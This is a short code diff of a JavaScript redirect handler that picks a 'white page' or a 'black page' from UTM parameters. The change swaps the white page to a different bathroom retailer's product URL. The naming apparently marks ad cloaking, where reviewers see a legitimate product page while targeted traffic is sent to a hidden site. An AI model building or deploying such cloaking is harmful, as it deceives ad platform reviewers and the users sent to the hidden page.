@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://shop.copenhagenbath.com/en/product/basins/christiansfeld-30-basin";
+    const whitePageURL = "https://www.lussostone.com/products/connaught-matte-white-wooden-adjustable-bath-end-panel-800mm?variant=47137901215994";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
